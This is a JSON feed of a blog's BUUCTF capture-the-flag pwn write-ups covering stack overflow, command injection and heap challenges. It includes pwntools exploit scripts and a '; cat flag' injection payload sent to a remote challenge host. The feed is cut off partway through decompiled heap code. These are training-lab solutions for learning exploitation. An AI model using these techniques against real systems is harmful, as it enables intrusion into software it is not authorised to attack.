{
    "version": "https://jsonfeed.org/version/1",
    "title": "Blog • All posts by \"buuctf\" category",
    "description": "",
    "home_page_url": "https://vvwwvv.cn",
    "items": [
        {
            "id": "https://vvwwvv.cn/2023/09/27/pwn/%E5%88%B7%E9%A2%98/BUUCTF/%E6%96%B0%E6%96%87%E6%A1%A3/",
            "url": "https://vvwwvv.cn/2023/09/27/pwn/%E5%88%B7%E9%A2%98/BUUCTF/%E6%96%B0%E6%96%87%E6%A1%A3/",
            "title": "Black Watch 入群题 PWN（）",
            "date_published": "2023-09-27T13:08:15.000Z",
            "content_html": "<h1 id=\"1程序分析\"><a class=\"anchor\" href=\"#1程序分析\">#</a> 1. 程序分析</h1>\n<p>32 位程序，开启 NX</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/27/pPbePw4.png\" alt=\"\" /></p>\n<p>源程序：</p>\n<p><code>main:</code></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> __cdecl <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>argv<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>envp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token function\">vul_function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"GoodBye!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><code>vul_function</code></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">ssize_t</span> <span class=\"token function\">vul_function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token class-name\">size_t</span> v0<span class=\"token punctuation\">;</span> <span class=\"token comment\">// eax</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token class-name\">size_t</span> v1<span class=\"token punctuation\">;</span> <span class=\"token comment\">// eax</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">char</span> buf<span class=\"token punctuation\">[</span><span class=\"token number\">24</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+0h] [ebp-18h] BYREF</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  v0 <span class=\"token operator\">=</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span>m1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> m1<span class=\"token punctuation\">,</span> v0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>s<span class=\"token punctuation\">,</span> <span class=\"token number\">0x200u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  v1 <span class=\"token operator\">=</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span>m2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> m2<span class=\"token punctuation\">,</span> v1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> buf<span class=\"token punctuation\">,</span> <span class=\"token number\">0x20u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><img data-src=\"https://z1.ax1x.com/2023/09/27/pPbet6f.png\" alt=\"\" /><br />\n可以看到 write 是输出两句话，但是 read 可以进行溢出</p>\n<p>没有后门函数</p>\n",
            "tags": [
                "pwn"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/09/24/pwn/%E5%88%B7%E9%A2%98/BUUCTF/PicoCTF_2018_buffer_overflow/",
            "url": "https://vvwwvv.cn/2023/09/24/pwn/%E5%88%B7%E9%A2%98/BUUCTF/PicoCTF_2018_buffer_overflow/",
            "title": "PicoCTF_2018_buffer_overflow（栈溢出）",
            "date_published": "2023-09-24T09:08:15.000Z",
            "content_html": "<h1 id=\"1查看程序信息\"><a class=\"anchor\" href=\"#1查看程序信息\">#</a> 1. 查看程序信息</h1>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/26/pPH8ckT.png\" alt=\"\" /><br />\n32 位程序，保护几乎都没开启</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/26/pPH82hF.png\" alt=\"\" /></p>\n<p>查看 vuln 函数，发现 <code>v0</code>  为 <code>eax</code> （不过没什么用），查看一下汇编</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/26/pPH8f1J.png\" alt=\"\" /></p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/26/pPH84XR.png\" alt=\"\" /></p>\n<p>发现有个后门函数可以读取 flag 文件<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/26/pPH8btO.png\" alt=\"\" /></p>\n<p>利用栈溢出返回到该地址即可</p>\n<h1 id=\"2exp\"><a class=\"anchor\" href=\"#2exp\">#</a> 2.exp:</h1>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">#context.log_level = 'debug'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p<span class=\"token operator\">=</span>process<span class=\"token punctuation\">(</span><span class=\"token string\">'./PicoCTF_2018_buffer_overflow_1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#e=ELF('./')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#p=remote('node4.buuoj.cn',28249)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">#shellcode = asm(shellcraft.sh())</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"string: \\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>payload1<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x28</span><span class=\"token operator\">+</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">0x80485CB</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#+p32()+p32()+p32()</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>本地：<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/26/pPHGk9g.png\" alt=\"\" /></p>\n<p>远程：<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/26/pPHJlZt.png\" alt=\"\" /></p>\n",
            "tags": [
                "pwn"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/09/24/pwn/%E5%88%B7%E9%A2%98/BUUCTF/bjdctf_2020_router/",
            "url": "https://vvwwvv.cn/2023/09/24/pwn/%E5%88%B7%E9%A2%98/BUUCTF/bjdctf_2020_router/",
            "title": "bjdctf_2020_router(Linux命令)",
            "date_published": "2023-09-24T09:08:15.000Z",
            "content_html": "<h1 id=\"1分析程序\"><a class=\"anchor\" href=\"#1分析程序\">#</a> 1. 分析程序</h1>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/24/pP7E8Fx.png\" alt=\"\" /><br />\n64 位程序，开启了 NX</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/25/pP7Eg1S.png\" alt=\"\" /><br />\n<img data-src=\"https://z1.ax1x.com/2023/09/25/pP7EIkq.md.png\" alt=\"\" /></p>\n<p>发现 <code>case 1</code>  中有后门函数，利用 <code>strcat</code>  函数进行拼接，那么我们就可以通过指令的连续执行来获取 flag</p>\n<p>通过  <code>;</code>  符合就可以分隔连续执行 <code>linux</code>  命令，那么我们只需要输入 <code>; cat flag</code>  就能得到 flag</p>\n<h1 id=\"2exp其实完全不需要直接nc连接就可以\"><a class=\"anchor\" href=\"#2exp其实完全不需要直接nc连接就可以\">#</a> 2.exp (其实完全不需要，直接 nc 连接就可以):</h1>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">27288</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>shellcode <span class=\"token operator\">=</span> asm<span class=\"token punctuation\">(</span>shellcraft<span class=\"token punctuation\">.</span>sh<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"choose:\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b\"1\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"address:\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>payload1<span class=\"token operator\">=</span><span class=\"token string\">\"; cat flag\"</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"https://z1.ax1x.com/2023/09/25/pP705fx.png\" alt=\"\" /></p>\n",
            "tags": [
                "pwn"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/09/24/pwn/%E5%88%B7%E9%A2%98/BUUCTF/easyheap/",
            "url": "https://vvwwvv.cn/2023/09/24/pwn/%E5%88%B7%E9%A2%98/BUUCTF/easyheap/",
            "title": "ZJCTF 2019EasyHeap（堆溢出，unlink，house of spirit）",
            "date_published": "2023-09-24T09:08:15.000Z",
            "content_html": "<h1 id=\"1分析程序信息\"><a class=\"anchor\" href=\"#1分析程序信息\">#</a> 1. 分析程序信息</h1>\n<p>64 位程序，开启了 nx 和 canary<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/26/pPHJYRg.png\" alt=\"\" /></p>\n<h2 id=\"源代码\"><a class=\"anchor\" href=\"#源代码\">#</a> 源代码：</h2>\n<h3 id=\"main\"><a class=\"anchor\" href=\"#main\">#</a> main：</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> __cdecl __noreturn <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>argv<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>envp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">int</span> v3<span class=\"token punctuation\">;</span> <span class=\"token comment\">// eax</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">char</span> buf<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+0h] [rbp-10h] BYREF</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> __int64 v5<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+8h] [rbp-8h]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  v5 <span class=\"token operator\">=</span> <span class=\"token function\">__readfsqword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x28u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token function\">setvbuf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stdout</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token function\">setvbuf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stdin</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>      <span class=\"token function\">menu</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>      <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> buf<span class=\"token punctuation\">,</span> <span class=\"token number\">8uLL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>      v3 <span class=\"token operator\">=</span> <span class=\"token function\">atoi</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">!=</span> <span class=\"token number\">3</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>      <span class=\"token function\">delete_heap</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">></span> <span class=\"token number\">3</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">==</span> <span class=\"token number\">4</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">==</span> <span class=\"token number\">4869</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int64<span class=\"token punctuation\">)</span>magic <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0x1305</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>          <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"So sad !\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>          <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Congrt !\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>          <span class=\"token function\">l33t</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>      <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>LABEL_17<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>        <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Invalid Choice\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">==</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>      <span class=\"token function\">create_heap</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">!=</span> <span class=\"token number\">2</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>        <span class=\"token keyword\">goto</span> LABEL_17<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>      <span class=\"token function\">edit_heap</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"delete_heap\"><a class=\"anchor\" href=\"#delete_heap\">#</a> delete_heap()：</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">unsigned</span> __int64 <span class=\"token function\">delete_heap</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">int</span> v1<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+Ch] [rbp-14h]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">char</span> buf<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+10h] [rbp-10h] BYREF</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> __int64 v3<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+18h] [rbp-8h]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  v3 <span class=\"token operator\">=</span> <span class=\"token function\">__readfsqword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x28u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Index :\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> buf<span class=\"token punctuation\">,</span> <span class=\"token number\">4uLL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  v1 <span class=\"token operator\">=</span> <span class=\"token function\">atoi</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v1 <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span> <span class=\"token operator\">||</span> v1 <span class=\"token operator\">></span> <span class=\"token number\">9</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Out of bound!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token function\">_exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>heaparray <span class=\"token operator\">+</span> v1<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>heaparray <span class=\"token operator\">+</span> v1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>heaparray <span class=\"token operator\">+</span> v1<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Done !\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"No such heap !\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token function\">__readfsqword</span><span class=\"token punctuation\">(</span><span class=\"token 